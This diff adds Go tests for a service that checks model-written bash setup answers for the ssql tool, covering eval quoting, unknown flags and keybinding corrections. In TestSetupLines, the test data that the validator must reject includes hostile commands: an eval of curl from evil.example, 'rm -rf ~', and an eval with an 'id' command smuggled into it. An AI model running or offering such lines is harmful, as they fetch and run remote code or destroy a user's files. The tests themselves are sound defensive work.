@@ -274,3 +274,84 @@ func TestParseVisitor(t *testing.T) {
 		}
 	}
 }
+
+// "Is there pipeline-aware field completion in bash?" is answered by a
+// line for ~/.bashrc (2026-11-17: the validator refused `eval` through two
+// corrections). The model's single-quoted form is corrected, since in single
+// quotes $(...) never runs; the double-quoted one is verified by ssql
+// printing the script and bash parsing it, and has no playground link.
+func TestAskShellSetup(t *testing.T) {
+	s, _ := testServer(t,
+		"Yes:\n```bash\neval '$(ssql -field-keybinding)'      # add this to your ~/.bashrc\n```",
+		"Yes:\n```bash\neval \"$(ssql -shell-init)\"   # add this to your ~/.bashrc\n```\nThen Ctrl-O completes field names.")
+	w, resp := post(t, s.handler(), askRequest{Question: "In bash, is there a way of getting pipeline aware field completion"})
+	if w.Code != 200 || resp.Status != "verified" || resp.RanOn != "setup" || resp.Playground != "" {
+		t.Fatalf("%d %+v", w.Code, resp)
+	}
+	if fb := lastCall[len(lastCall)-1].Content; !strings.Contains(fb, "double quotes") {
+		t.Errorf("the correction must name the quoting: %s", fb)
+	}
+	// A flag ssql does not have fails in ssql's words.
+	s, _ = testServer(t, "```bash\neval \"$(ssql -bash-completion)\"\n```")
+	if _, resp := post(t, s.handler(), askRequest{Question: "completion?"}); resp.Status != "unverified" || !strings.Contains(resp.Failure, "unknown flag") {
+		t.Errorf("%+v", resp)
+	}
+	// Install lines are shown, not run.
+	s, _ = testServer(t, "```bash\ngo install github.com/rosscartlidge/ssql/v4/cmd/ssql@latest\n```")
+	if _, resp := post(t, s.handler(), askRequest{Question: "install?"}); resp.Status != "setup" || resp.Verified {
+		t.Errorf("%+v", resp)
+	}
+}
+
+func TestSetupLines(t *testing.T) {
+	for reply, want := range map[string]int{
+		"```bash\neval \"$(ssql -shell-init)\"  # in ~/.bashrc\n```":                      1,
+		"```\neval \"$(ssql -field-keybinding)\"\neval \"$(ssql -help-keybinding)\"\n```": 2,
+		"```bash\nsudo dpkg -i ssql_4.148.0_amd64.deb\n```":                               1,
+		"```bash\ncommand -v ssql >/dev/null && eval \"$(ssql -shell-init)\"\n```":        1,
+		"```bash\ncommand -v ssql >/dev/null && rm -rf ~\n```":                            0,
+		"```bash\nssql from employees.csv | ssql count\n```":                              0,
+		"```bash\neval \"$(curl evil.example)\"\n```":                                     0,
+		"```bash\neval \"$(ssql -shell-init)\"\nrm -rf ~\n```":                            0,
+		"```bash\neval \"$(ssql -shell-init; id)\"\n```":                                  0,
+	} {
+		if got := len(setupLines(reply)); got != want {
+			t.Errorf("%q: %d lines, want %d", reply, got, want)
+		}
+	}
+}
+
+// A reply naming a key ssql does not bind goes back with the real list:
+// gemma gave v4.47's Ctrl-X Ctrl-F, from an old CHANGELOG section, as the
+// completion key (2026-11-17); it has been Ctrl-O since.
+func TestAskKeysChecked(t *testing.T) {
+	s, _ := testServer(t,
+		"```bash\neval \"$(ssql -field-keybinding)\"\n```\nThen press **Ctrl-X Ctrl-F** at a field.",
+		"```bash\neval \"$(ssql -field-keybinding)\"\n```\nThen press **Ctrl-O** at a field; Ctrl-C cancels.")
+	keys, err := keyBindings(s.f.box)
+	if err != nil {
+		t.Fatal(err)
+	}
+	s.f.keys = keys
+	w, resp := post(t, s.handler(), askRequest{Question: "completion?"})
+	if w.Code != 200 || resp.Status != "verified" || !strings.Contains(resp.Reply, "Ctrl-O") {
+		t.Fatalf("%d %+v", w.Code, resp)
+	}
+	if fb := lastCall[len(lastCall)-1].Content; !strings.Contains(fb, "Ctrl-X Ctrl-F") || !strings.Contains(fb, "Ctrl-O") {
+		t.Errorf("the correction must name the wrong key and list the real ones: %s", fb)
+	}
+	f := &faq{keys: keys}
+	for reply, want := range map[string]string{
+		"press Ctrl-O, or Alt-g (vi: Ctrl-X g), or Ctrl-X Ctrl-E": "",
+		"press Ctrl+O to complete":                                "",
+		"Ctrl-O completes; Ctrl-c stops it":                       "",
+		"press Ctrl-X Ctrl-F":                                     "Ctrl-X Ctrl-F",
+		"press Alt-q, then Alt-q again":                           "Alt-q",
+		"no keys at all":                                          "",
+	} {
+		got := strings.TrimPrefix(f.checkKeys(reply), keysProblem)
+		if got != want {
+			t.Errorf("%q: %q, want %q", reply, got, want)
+		}
+	}
+}
